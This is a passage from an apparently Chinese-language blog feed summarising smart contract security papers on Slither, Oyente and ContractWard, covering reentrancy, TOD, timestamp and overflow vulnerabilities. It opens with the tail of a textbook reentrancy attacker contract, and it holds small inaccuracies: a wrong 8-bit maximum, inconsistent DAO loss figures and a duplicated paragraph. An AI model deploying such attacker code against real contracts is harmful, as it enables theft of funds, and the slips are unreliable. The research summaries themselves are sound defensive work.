class="hljs-comment">//攻击方将会递归进行提币操作</span><br>    entrance.withdraw(<span class="hljs-number">0.5</span> ether);<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br>      msg.sender.transfer(<span class="hljs-built_in">this</span>.balance);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201022212603.png" alt="在这里插入图片描述"></p><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>Slither是一个用Python 3编写的智能合约静态分析框架，提供如下功能：</p><ul><li>自动化漏洞检测（Automated vulnerability detection）。提供超30多项的漏洞检查模型，模型列表详见：<a href="https://github.com/crytic/slither#detectors%E3%80%82">https://github.com/crytic/slither#detectors。</a></li><li>自动优化检测（Automated optimization detection）。Slither可以检测编译器遗漏的代码优化项并给出优化建议。</li><li>代码理解（Code understanding）。Slither能够绘制合约的继承拓扑图，合约方法调用关系图等，帮助开发者理解代码。</li><li>辅助代码审查（Assisted code review）。用户可以通过API与Slither进行交互。</li></ul><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><p>Slither的工作方式如下：</p><ol><li>Solidity compiler：==智能合约源码==经过solc编译后得到Solidity抽象语法树（Solidity Abstract Syntax Tree，AST）作为Slither的输入；可以指定Slither去调用一些常见的框架（包括Truffle，Embark和Dapp）去分析一份智能合约。</li><li>information recovery（数据整合）：Slither会生成一些重要的信息，比如合约的继承图（inheritance graph）、控制流图（CFG）以及合约中函数列表。</li><li>SlithIR conversion：Slither将合约代码转换为<a href="https://github.com/crytic/slither/wiki/SlithIR">SlithIR</a>（一种内部表示语言），目的是通过简单的API实现高精度分析，支持污点和值的跟踪，从而支持检测复杂的模型。</li><li>在代码分析阶段，Slither运行一组预定义的分析，包括合约中变量、函数的依赖关系；变量的读写和函数的权限控制。</li><li>经过Slither的核心处理之后，就可以提供漏洞检测、代码优化检测和代码理解输出等。</li></ol><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201022200230.png" alt="image-20201022200218960"></p><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><p>本文的一个重要部分是将Slither与其他智能合约静态分析工具进行比较，我们将Slither（版本0.5.0）与其他开源静态分析工具进行对比，以检测以太坊智能合约中的漏洞，对比的对象有：Securify（版本37e2984），SmartCheck（版本4d3367a）和Solhint（版本1.1.10）。我们决定以检测可重入漏洞作为评估检测好坏的标准，因为可重入漏洞是最古老，最易理解和最危险的安全问题之一。</p><p>它在第一个月筹集了超过1.5亿美元的资金。2016年6月17日，黑客从该组织的“重入性”漏洞中抽走了5000万美元。从以太经典（ETC）到以太币（ETH）的硬叉导致了解决这次黑客攻击所产生问题的所有努力。图2显示了一个简单的可重入合约的经典示例，该合约可被人利用以抽取其所有以太币。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201022210547.png" alt="img"></p><p>可重入检测器（The reentrancy detecto）是我们评估的所有工具中可用的少数几个之一。此外，我们尝试了Etherscan提供其源代码的一千个最常用的合同（交易数量最大的那些合同），以获得以下结果：</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201022210524.png" alt="image-20201022210524839"></p><p>观察结果可知</p><ol><li>准确性：每行汇总了误报、标记的合同和每个合同的检测准确性结果。 我们的实验表明，Slither是最准确的工具，其误报率最低，为10.9％； 其次是Securify，占25％.相反，SmartCheck和Solhint的假阳性率极高：分别为73.6％和91.3％</li><li>性能：平均执行时间（Average execution time）和超时分析（Timed-out analyses）行汇总了性能结果，确认Slither是最快的工具，其次是Solhint，SmartCheck，最后是Securify。</li><li>鲁棒性：<em>Failed analyses</em> row 总结了健壮性结果，显示Slither是最健壮的工具，其次是Solhint、SmartCheck和Securify。 Slither只对0.1%的合同误报，与此同时，Solhint大约是1.2%左右。SmartCheck和Securify的表现就没那么稳健了，分别有10.22%和11.20%的失败率。</li></ol><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>Slither自从被开发出来，技术迭代速度很快。截止到目前（2020.10.22），开发者最近发布了<a href="https://github.com/crytic/slither/releases/tag/0.6.13">Slither0.6.13</a>版，对其做了一些技术改进并添加了一些功能。目前Slither已经拥有96多个开源探测器，包含两个YUL特定检测器，适用于竞态条件、弱加密和其他关键漏洞的检测。相比于其他用于出于科研目的，论文一经发表就不再维护而言的工具而言，Slither有更好健壮性。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Making Smart Contracts Smarter</title>
    <link href="/2020/1099f71f36.html"/>
    <url>/2020/1099f71f36.html</url>
    
    <content type="html"><![CDATA[<h1 id="Making-Smart-Contracts-Smarter"><a href="#Making-Smart-Contracts-Smarter" class="headerlink" title="Making Smart Contracts Smarter"></a>Making Smart Contracts Smarter</h1><p>论文标题：(2016-CCS) <a href="https://dl.acm.org/doi/abs/10.1145/2976749.2978309">Making Smart Contracts Smarter</a> ——使智能合约更智能</p><p>论文引用：Luu L, Chu D H, Olickel H, et al. Making smart contracts smarter[C]//Proceedings of the 2016 ACM SIGSAC conference on computer and communications security. 2016: 254-269.</p><p>代码开源：<a href="https://github.com/enzymefinance/oyente">oyente: An Analysis Tool for Smart Contracts</a></p><h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>在本文中，作者研究了在类似加密货币的开放式分布式网络中基于以太坊运行智能合约的安全性。并且介绍了几个安全性问题，在这些问题中，对手可以操纵智能合约的执行以获取利益。这些错误表明在理解底层平台的分布式语义方面存在细微的差距。作者提出了增强以太坊操作语义的方法，以减少合同的脆弱性。对于为现有的以太坊系统写智能合约的开发人员，构建了一个名为Oyente的符号执行工具来发现潜在的安全漏洞。</p><p>在19366份现有以太坊合同中，Oyente标记其中8833份为易受攻击的合同，其中包括TheDAO错误，该错误导致2016年6月损失了6000万美元。</p><h3 id="背景知识：符号执行"><a href="#背景知识：符号执行" class="headerlink" title="背景知识：符号执行"></a>背景知识：符号执行</h3><p>符号执行是一种传统的自动化漏洞挖掘技术, 目前也被广泛用于智能合约的漏洞挖掘。符号执行引擎为目标代码提供符号化的虚拟运行环境, 将程序所需的外部输入抽象为取值不固定的符号值, 并通过不断求解路径约束, 来尽可能的探索程序分支。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201029221259.png"></p><p>符号执行的主要思想是把程序执行过程中不确定的输入转换为符号值, 以推动程序执行与分析我们以下面代码为例, 对符号执行的基本流程进行解释。图1对应的示例代码如下:   </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract sample&#123;        <br>uint  g_var;          <br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">foo1</span>(<span class="hljs-params">uint  m, uint n</span>) <span class="hljs-title">public</span></span>&#123;         <br><span class="hljs-keyword">if</span>(m &gt; n)&#123;                         <br>g_var  =  m;         <br>&#125;<span class="hljs-keyword">else</span>&#123;                         <br>g_var  =  n;         <br>&#125;     <br>&#125;         <br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">foo2</span>(<span class="hljs-params">uint  x</span>) <span class="hljs-title">public</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(g_var  &lt;  x)&#123;<br>        g_var  =  x;         <br>         &#125;     <br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>无论是智能合约还是传统平台中的程序, 都可以被抽象为一棵执行树。在正常的执行流程中, 由于程序输入为定值, 每个条件判断都可以得到确定的答案, 因此仅有一条分支被探索。</p><p>而在符号执行中, 输入值为不定的符号变量, 当遇到条件判断时, 符号执行引擎会利用==约束求解器==对包含符号变量的表达式进行求解。对于所有有解的分支, 符号执行都会进行分析, 并记录路径中的约束。</p><p>在上图中, 合约调用的输入有两个, 一个是待调用的函数, 一个是函数的输入。对于图1中的路径  1  来说, 当程序执行到叶子节点时, 该路径的约束有两个: [Func == foo1, m &gt; n], m和n皆为符号化的输入值。对于符号执行来说, 智能合约与传统程序的差异主要在于合约中全局变量的取值是不确定的。因此通常情况下除了输入值, 智能合约的全局变量也需要被处理为符号值。</p><h2 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h2><h3 id="Oyente"><a href="#Oyente" class="headerlink" title="Oyente"></a>Oyente</h3><p>Oyente是在论文发表之后一段时间才由melon.fund于2018年10月发布的一款为现有的以太坊智能合约开发人员构建的符号执行工具，以发现智能合约中潜在的安全漏洞。其基本介绍：</p><ol><li>开发语言：Python</li><li>工具类型：静态分析工具</li><li>分析内容：EVM字节码</li><li>工具原理：Oyente将需要分析的合约的==字节码==和当前以太坊的全局状态作为输入，检测合约是否存在安全问题，并向用户输入有问题的符号路径。在这个过程中，使用Z3求解器来确定可满足性。</li><li>模块划分：包含  4  个核心组件,    控制流图生成器(CFG   Builder),   探索器(Explorer), 分析器(Core Analysis)和验证器(Validator)。</li></ol><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201029222806.png" alt="image-20201029221903218"></p><ul><li><p>控制流图生成器（CFGBuilder）：对合约进行预分析, 为合约构建基本的控制流图, 以基本块为节点, 跳转关系为边；然而部分跳转关系并不能由生成器完全确定。</p></li><li><p>探索器（Explorer）：对智能合约进行符号执行, 并在执行过程中将这些信息补齐。探索器承担着收集合约信息的重要责任, 它本质上是一个循环, 依次执行合约控制流图中各个基本块的代码。它利用  <strong>Z3  求解器</strong>对合约中的条件跳转进行求解, 探索器根据求解结果决定对哪个分支进行分析, 当条件跳转的两个分支条件都有解时, 两个分支都会被探索。</p></li><li><p>分析器（CoreAnalsis）：包含用于检测合同的子组件，这些合同是TOD，与时间戳相关或异常处理的异常。Explorer仅收集表现出不同的以太流的路径。 因此，根据当交易顺序改变时发出的以太币是否不同来检测合约是否为TOD。 同样，如果要发送的条件包括块时间戳，我们将检查合同是否与时间戳相关。 我们描述了我们如何执行以下分析</p><ul><li>TOD（transaction-ordering dependent）检测。 Explorer返回一组路径以及每个路径对应的以太流。 因此，我们的分析将检查两条不同的路径是否有不同的以太流。 如果合同中有这样的痕迹对，Oyente会将其报告为TOD合同。</li><li>时间戳依赖性检测。 我们使用特殊的符号变量来表示块时间戳。 请注意，块时间戳在执行期间保持不变。 因此，给定轨迹的路径条件，我们检查是否包含此符号变量。 如果合同的任何跟踪依赖于此符号变量，则将合同标记为与时间戳相关。</li><li>错误处理的异常。 检测错误处理的异常很简单。 回想一下，如果被调用方产生了例外，它将0推入调用方的操作数堆栈。 因此，我们仅需要在每次调用后检查合同是否执行ISZERO指令（该指令检查堆栈的最高值是否为0）。 如果不是，则忽略被调用方中发生的任何异常。 因此，我们将此类合同标记为处理异常的合同。</li><li>重入检测。 我们利用路径条件来检查重入漏洞。 在遇到的每个CALL，我们在执行CALL之前获取执行的路径条件。 然后，我们检查这个条件带有更新变量（例如存储值）是否仍然成立（即，是否可以再次执行call 指令）。 如果是这样，我们认为这是一个漏洞，因为被调用者有可能在完成调用之前重新执行调用操作。</li></ul></li><li><p>验证器（Validator）：试图消除误报。 例如，假设CoreAnalysis将一个合同标记为TOD，并且其两条迹线t1和t2表现出不同的以太流量，验证器将查询Z3以检查排序（t1，t2）和（t2，t1）是否都可行。 如果不存在这样的t1和t2，则将该案例视为误报。 但是，由于我们还没有完全模拟以太坊的执行环境，Validator还远远不够完善。 对于第6节中介绍的结果，我们采用尽力而为的 手动分析来确认安全漏洞。 换句话说，Oyente当前的主要用途是标记潜在的易受攻击的合同。 全面的误报检测将留待以后的工作。</p></li></ul><h2 id="总结评价"><a href="#总结评价" class="headerlink" title="总结评价"></a>总结评价</h2><p>1、Oyente是最早关注到自动化合约漏洞挖掘的工作之一, 提供了一个实现较为精简的合约符号执行引擎；尽管  Oyente  的部分检测方案并不完善, 涉及的漏洞也不够全面, 但依旧作为开创性的工作, 为后续研究提供了很好的支持。</p><p>2、Oyente 在论文中介绍了对条件竞争、时间戳依赖、未校验返回值以及重入漏洞等四种合约漏洞的检测方案，并在开源代码中进一步补充了整数上溢、整数下溢、调用栈溢出等常见漏洞的检测代码。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Contractward: Automated vulnerability detection models for ethereum smart contracts</title>
    <link href="/2020/10c7caf55.html"/>
    <url>/2020/10c7caf55.html</url>
    
    <content type="html"><![CDATA[<h1 id="ContractWard：Automated-Vulnerability-Detection-Models-for-Ethereum-Smart-Contracts"><a href="#ContractWard：Automated-Vulnerability-Detection-Models-for-Ethereum-Smart-Contracts" class="headerlink" title="ContractWard：Automated Vulnerability Detection Models for Ethereum Smart Contracts"></a>ContractWard：Automated Vulnerability Detection Models for Ethereum Smart Contracts</h1><p>论文标题：(2020-TNSE) <a href="https://ieeexplore.ieee.org/abstract/document/8967006/">ContractWard- Automated Vulnerability Detection Models for Ethereum Smart Contracts</a>——以太坊智能合约的自动漏洞检测模型</p><p>论文引用：Wang W, Song J, Xu G, et al. Contractward: Automated vulnerability detection models for ethereum smart contracts[J]. IEEE Transactions on Network Science and Engineering, 2020.</p><p>代码开源：未找到开源代码</p><h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>本文作者提出了ContractWard，其使用机器学习技术检测智能合约中的漏洞。首先，从智能合约的简化操作代码（simplified operation codes）中提取二元语法（bigram）特征；然后采用五种机器学习算法和两种采样算法来构建模型。</p><p>通过以太坊上运行的49502个实际运行智能合约来对ContractWard进行了评估，结果表明： 当使用XGBoost训练模型和使用SMOTETomek平衡训练集时，预测的ContractWard的Micro-F1和Macro-F1超过96％，每个智能合约的平均检测时间为4秒。</p><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>Oyente ，Mythril和Securify这几种现有的工具很耗时，可能不适合批量漏洞检测，因为这些工具主要采用符号执行或符号分析，这些符号执行或符号分析需要探索合同中的所有可执行路径或分析合同的依赖关系图（dependency graphs）。</p><p> ContractWard是基于机器学习技术，目的是在确保的检测准确性的前提下提高智能合约中漏洞检测的效率；它能够根据从训练样本中学到的漏洞来快速有效地检测漏洞。主要分三步构建ContractWard：</p><ol><li>在2018年11月使用以Solidity语言编写的源代码收集了49502个经过验证的以太坊智能合约，将合同标记为Oyente的六种漏洞。</li><li>从操作码（operation codes，opcodes）中提取描述合同静态特征的典型特征。源代码被编译为字节码（bytecodes），字节码被转换为操作码。</li><li>用机器学习算法来检测智能合约中的漏洞<ol><li>采用两种采样算法，即综合少数群体过采样技术（Synthetic Minority Oversampling Technique，SMOTE）和SMOTETomek ，以平衡训练数据集，因为数据是类别不平衡（class-imbalance）的。</li><li>检测测试智能合约是否易受攻击，采用五种机器学习算法：<ol><li>极限梯度提升（eXtreme Gradient Boosting，XGBoost）</li><li>自适应提升（adaptive boosting，AdaBoost）</li><li>随机森林（Random Forest，RF）</li><li>支持向量机（Support Vector Machine，SVM）</li><li>k-最近邻（k-Nearest Neighbor，KNN）</li></ol></li></ol></li></ol><p>主要贡献如下：</p><ol><li>提出ContractWard的系统，用于通过机器学习算法对以太坊智能合约进行大规模，自动的漏洞检测。与现有的工作主要依靠符号执行不同，ContractWard从训练样本中学习易受攻击合同的模式以进行检测。</li><li>为了更好地描述智能合约的特征，从以太坊官方网站收集了49502个实际的智能合约。进一步从简化的操作代码中提取1619维双峰特征（1619 dimensional bigram features），以构建特征空间。</li><li>ContractWard快速、有效和自动地检测智能合约的六个漏洞。在真实合同上运行ContractWard，系统的（predictive recall）和准确性达到96％以上。此外，每个合约的检测时间约为4秒。经实践证明，ContractWard节省时间、且适合批量检测智能合约中的漏洞。</li></ol><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><h4 id="智能合约的字节码和操作代码"><a href="#智能合约的字节码和操作代码" class="headerlink" title="智能合约的字节码和操作代码"></a>智能合约的字节码和操作代码</h4><p>在 EVM 上，它使用三个步骤来部署合同：</p><ol><li>首先，源代码由开发人员用高级语言编写的（例如：Solidity）</li><li>其次，源代码被编译器编译为字节码（Bytecodes）或EVM 码（EVM code）；字节码是由十六进制数字编码的字节数组。</li><li>字节码通过以太坊客户端（Ethereum client）上载到 EVM。</li></ol><p>字节码可以转换为 EVM 指令（instructions）或操作代码（opcodes）。根据以太坊黄皮书，有135个操作指令，具有10个功能：</p><ul><li>停止和算术操作（stop and arithmetic operations）</li><li>比较和位逻辑操作（comparison and bit-wise logic operations）</li><li>SHA3操作（SHA3 operations）</li><li>环境信息操作（environment information operations）</li><li>块信息操作（block information operations）</li><li>堆栈、内存、存储和流操作（stack, memory, storage and flow operations）</li><li>推送操作（push operations）</li><li>交换操作（exchange operations）</li><li>日志记录操作（logging operations）</li><li>系统操作（system operations）</li></ul><p>目前，某些指令未定义，它们将仅用于将来的扩展。由于源代码中定义了大量人为变量（man-made variables），因此使用源代码分析智能合约可能不合适。</p><ul><li>例如，有两个名为 A 和 B 的合同，其中合同 A 的函数声明是 <code>function transfer（address _to,uint256 _value)</code>，而合同B的函数声明：<code>function transfer（address _receiver; uint256 _token)</code>；它们看起来与源代码大不相同，但在操作代码中相似。</li></ul><p>显然，使用操作代码分析智能合约会更容易。下图说明了源代码、字节码和操作码之间的关系</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015103643.png" alt="image-20201015103643570"></p><center>The Relationships among Source Codes, Bytecodes and Opcodes</center><h4 id="智能合约中的六种安全漏洞"><a href="#智能合约中的六种安全漏洞" class="headerlink" title="智能合约中的六种安全漏洞"></a>智能合约中的六种安全漏洞</h4><h5 id="整数溢出和整数下溢漏洞"><a href="#整数溢出和整数下溢漏洞" class="headerlink" title="整数溢出和整数下溢漏洞"></a>整数溢出和整数下溢漏洞</h5><p>Integer Overflow and Integer Underflow Vulnerabilities</p><p>计算机语言中的整数类型值具有最大值（max）和最小数（min）范围，整数类型在区块链上是无符号（unsigned）的，因此最小值为 0。假设一个无符号整数为 8 位，因此最大值为 $2^8$。当计算超过最大值或低于最小值时，由于$max +1\to min$ 和$min -1 \to max$</p><h5 id="事务序列性依赖-（TOD）"><a href="#事务序列性依赖-（TOD）" class="headerlink" title="事务序列性依赖 （TOD）"></a>事务序列性依赖 （TOD）</h5><p>Transaction-Ordering Dependence</p><p>在区块链上，智能合约的表现因交易序列而异。不幸的是，这些序列可能被矿工操纵。考虑一个待定事务池（the pending transaction pool，txpool）有两个新事务（ $T$ 和 $T_i$） 和区块链处于状态 $S$，并且状态 $S$ 只有在事务$T$ 处理时才能转换为状态 $S_1$。</p><ul><li>最初，$T$ 应在状态 $S$中处理，因此状态从  $S \to S_1$。</li><li>但矿工可以按照自己的意愿在$T$之前处理$T_i$交易，然后状态从 ，$S \to S_2$而不是从 $S$到$S_1$。因此，如果此时处理 T，则状态将更改为另一个新状态 $S_3$。在上述情况下，$T$ 在不同的块状态(block states)中处理，并且由预期事务序列的更改而产生漏洞。</li></ul><h5 id="调用堆栈深度攻击漏洞"><a href="#调用堆栈深度攻击漏洞" class="headerlink" title="调用堆栈深度攻击漏洞"></a>调用堆栈深度攻击漏洞</h5><p>Callstack Depth Attack Vulnerability</p><p>在以太坊，在以太坊，合同可以通过某些指令调用其他合同，例如，例如：<code>:send()</code>、 <code>:call()</code>、<code>:delegatecall()</code>、<code>.transfer()</code>。但是，如果调用堆栈的深度超过阈值（threshold），除了<code>.transfer()</code>，其他操作不会引发异常而只会返回 false。如果不检查返回值，则调用方（caller）不会意识到调用失败。因此，合同应检查指令的返回值，以确定执行是否按计划进行。</p><h5 id="时间戳依赖"><a href="#时间戳依赖" class="headerlink" title="时间戳依赖"></a>时间戳依赖</h5><p>Timestamp Dependency</p><p>当协定使用块变量(block variables)作为调用条件来执行某些关键操作（例如，sending tokens或作为生成随机数的种子）时，就会发生此漏洞。一些变量在块标题（block header），包括BLOCKHASH, TIMESTAMP, NUMBER, DIFFICULTY,<br>GASLIMIT和COINBASE，因此，原则上它们能顾被矿工更改。例如，矿工有权在900 秒以内的偏移来设置块的TIMESTAMP 。如果基于块变量传输加密货币，则矿工可以通过篡改这些块变量来利用这些漏洞。</p><h5 id="重入漏洞"><a href="#重入漏洞" class="headerlink" title="重入漏洞"></a>重入漏洞</h5><p>Reentrancy Vulnerability</p><p>重入漏洞是一个臭名昭著的漏洞。智能合约的特性是调用、利用来自外部合约的代码。触发外部合同或向帐户发送加密货币的功能需要提交外部调用（external call）。外部调用可能会被攻击者劫持，以强制合同执行重入代码（reentrant codes），包括回叫（calling back themselves）。因此，相同的代码重复执行，就像编程语言中的间接递归函数调用一样，该漏洞在 2016 年的 DAO 合同中被发现。</p><h2 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h2><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412115655.png" alt="image-20210412115655738"></p><h3 id="DETECTION-MODELS"><a href="#DETECTION-MODELS" class="headerlink" title="DETECTION MODELS"></a>DETECTION MODELS</h3><p>ContractWard由六个步骤构建。 </p><ol><li>首先，我们从以太坊官方网站收集大量新鲜且经过验证的智能合约</li><li>源代码转换为操作代码,，然后简化操作代码。</li><li>从简化的合同操作代码中提取1619 维bigram特征， 并标记具有六种类型的漏洞的合同</li><li>我们采用One vs. Rest (OvR)算法进行多标签分类，其中 C1 、 C2 、 C3 、 C4 、 C5 和 C6 对应于整数溢出漏洞（Overflow）、整数下溢漏洞（Underflow）、事务排序依赖性（ TOD ）、调用堆栈深度攻击漏洞（ Calltack ）、时间戳依赖性（Timestamp）和重入漏洞（(Reentrancy）。</li><li>为了平衡的示例，如 C1 vs 或 C2，我们直接执行分类。对于其余四种类型的漏洞，我们需要使用采样算法在分类前平衡它们，因为类不平衡(class imbalance) 。</li><li>在用于检测的平衡训练集（the balanced training sets）上构建检测模型</li></ol><h3 id="Data-Sets-Labels-and-Feature-Space"><a href="#Data-Sets-Labels-and-Feature-Space" class="headerlink" title="Data Sets, Labels and Feature Space"></a>Data Sets, Labels and Feature Space</h3><p>数据集（Data Sets）：从以太坊官方网站收集 49502 份包含源代码的智能合约，在 2018 年 9 月之前已验证了智能合约。数据显然可靠、权威和可理解。数据集包含六种类型的漏洞的合同。数据集的说明显示在表1中。对于整数溢出漏洞和整数下溢漏洞，negative（invulnerable，无漏洞）与positive（vulnerable，有漏洞）示例的比率是平衡的。对于其余四种类型的漏洞，阴性与阳性的比率相当不平衡，甚至高达 100：1。阴性示例在多数类中，阳性示例无一例外地在少数类中。通常，如果一个类别与另一个类别的比率超过 5：1，则示例被视为类不平衡（class imbalance）。</p><center>TABLE 1 THE DESCRIPTION OF DATA SETS</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015115657.png" alt="image-20201015115657264"></p><p>标签（Labels）：使用 Oyente来标记所有合同，每份合同都有六个标签。然后，手动检查标签的正确性。在每种类型的漏洞中，标签彼此独立。例如，具有多标签矢量的示例（如 [1 0 1 0 0 0] ）表明第一个和第三个漏洞，并且 [0 0 0 0 0 0] 的示例理论上没有漏洞。</p><p>Oyente 于 2018 年 7 月更新，包括但不限于 （1） 通过向发送金额添加阈值（例如：sending gas &gt; 2300 和sending tokens &gt; depositing tokens）来减少重入漏洞的误报(false positives);（2）增加 Callstack 漏洞、整数溢出漏洞和整数下溢漏洞检测。（3）将可还原溢出（revertible overflow）视为溢出漏洞的误报。同时，许多论文 使用Oyente特作为比较的基准。故而假设 Oyente 生成的标签是可靠的。</p><p>特征空间（Feature Space）：采用 n-gram 算法进行特征提取。N-Gram是指连续出现在文本中的n个单词。这是一个概率语言模型（probabilistic language model），鉴于一阶马尔科夫链假说（first-order Markov Chain hypothesis），其中单词只与前面的少数字有关，因此没有必要追溯到智能合约中的第一个操作代码。 </p><ul><li>通过二进制字节大小的滑动窗口（sliding window），操作代码被分割成巨大的 n-grams (massive n-grams)。特别，unigrams、bigrams and trigrams是 n-gram 的示例，其中n分别是 1、2 和 3。</li><li>换句话说，下一个单词的显示取决于它前面的单词，即bigram；而下一个单词根据前面的两个单词出现，称为trigram。在这项工作中，我们使用bigrams作为特征。根据作者的统计，每份合同的运算码长度平均约为4364个，总共有100多种操作代码。因此，直接使用n-gram算法提取特征可能会导致特征数量过多导致的维数诅咒（the curse of dimensionality）。</li></ul><p>为了减少特征的维数，通过取消操作数（dislodging the operands）和将功能上相似的运算码识别为一类来简化操作代码。具体来说就是：</p><ul><li>可以删除每个推送指令（push instruction）后跟的操作数(operand)。</li><li>对于块信息说明（block information instructions），简化的 opcode 将作为六个操作代码的替换，这些操作码对 Timestamp 漏洞有同样的影响。因此，在处理之后，只剩下大约50个操作代码。表 II 中介绍了操作代码的简化规则。</li></ul><center>TABLE II THE SIMPLIFICATION RULES</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015150142.png" alt="image-20201015150142362"></p><p>如表 III 所示，简化后，从简化的操作代码片段中提取 bigram 功能。每个独特的 bigram 都是一个特征，最终我们提取 1619 维特征，用于识别漏洞。构造一个特征空间 （feature space，FS），其中每个合同都有其相应的特征向量。特征向量中的每个特征值计算为在该维度的bigram与合同中全部bigrams数量的比值。特征空间（FS） 在公式 1 中定义：</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015151319.png" alt="image-20201015151319755"></p><p>其中 $f_{ij}$ 是 $j_{th}$ 合同中 $i_{th}$ bigram 的特征频率，介于 0 和 1 之间。定义 $n_i$,$c_j$ 作为 $j_{th}$ 合同中 $i_{th}$ bigram 发生的数量；并定义 $n_{all}$,$c_j$ 作为同一合同中所有bigram发生的总和。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015151308.png" alt="image-20201015151307992"></p><p>如果合同中其中一个bigram特征未出现，则相应的 $f_{ij}$为 0。</p><h3 id="Training-Sets"><a href="#Training-Sets" class="headerlink" title="Training Sets"></a>Training Sets</h3><p>通常，训练集可以包括从监督分类（supervised classification）中从整个数据集中随机选择的多达 70% 的样本。 然而，在这项工作中，如前所述，训练集不平衡，因为分类类别大致不能平均表示。例如，典型的不平衡数据集（a typical imbalanced data sets）可能包含 97% 阴性的合同示例和 3% 易受攻击的合同示例。如果所有示例都被确定为无漏洞的示例，则预测的准确性为 97%。但是，漏洞检测旨在获取易受攻击合同示例中的高召回率（high recall，R） 和精度 （precision，P）。因此对于不平衡的数据集，只有高精度显然不合适。</p><p>召回率 / 查全率 ($recall_k=\frac{TP}{TP+FN}$)：指的是被预测为阳性例的占总的阳性例的比重</p><p>精准度 / 查准率($precision_k=\frac{TP}{TP+FP}$)：指被分类器判定阳性例中的阳性样本的比重</p><p>在我们的训练集中，对于某些类型的漏洞，阴性和阳性示例之间的比率相当不平衡，甚至高达 100：1。为了解决这个问题，我们采取措施减少训练集中的分类不平衡影响（the class-imbalance impact）。在细节上，采用</p><ul><li>合成少数类（Synthetic Minority Oversampling Technique，SMOTE），SMOTE是一种过采样技术（oversamplin technique），在少数类之间插值以产生额外的类。当使用 SMOTE 算法时，可能会生成具有无效信息的样本，从而增加少数类的重叠。</li><li>SMOTE和TomekLinks的组合（SMOTETomek），将少数类的数量扩展至多数类的数量级；SMOTETomek 是一种组合采样技术（combined sampling technique），其使用 SMOTE 的过采样，以及可以删除具有邻域关系（Tomek’s links）的样本的下采样（undersampling）。因此，它可以在采样过程中删除无用的样本。</li><li>它们都支持多标签重新采样（multilabel resampling）。表四介绍了原始训练集的比例、SMOTE 平衡的训练集后的比例以及 SMOTETomek 平衡的训练集后的比例。我们采用基于平衡数据集的五种监督学习算法，以实现多标签分类。</li></ul><p>但是，SMOTETomek 是一种组合采样技术（combined sampling technique）。其使用 SMOTE 的过采样后跟下采样，可以删除具有邻域关系的样本（Tomek 的链接）。因此，它可以在采样过程中删除无用的样本。它们都支持多标签重新采样。表四介绍了原始培训组的比例、与 SMOTE 平衡的训练集的比例以及与 SMOTETomek 平衡的训练集在类别中的比例。我们采用基于平衡数据集的五种监督学习算法，以实现多标签分类。</p><center>TABLE IV THE RATIOS OF POSITIVE TO NEGATIVE SAMPLES AFTER SAMPLING</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015153526.png" alt="image-20201015153526273"></p><h3 id="Classification-Algorithms"><a href="#Classification-Algorithms" class="headerlink" title="Classification Algorithms"></a>Classification Algorithms</h3><p>在训练集中有 $y_i\in{C_1,C_2,C_3,C_4,C_5,C_6}$ 和 $D = {(x_1,y_1),(x_2,y_2),…(x_i,y_i)…(x_k,y_k)}$ ，多标签分类任务是通过拆分实现的，即将多标签分类任务划分为多个二进制分类任务。每个二进制分类任务都训练分类器，最后训练了六个分类器。这些二进制分类器的分类结果被集成，以提供多标签分类的最终结果。采用 One vs. Rest 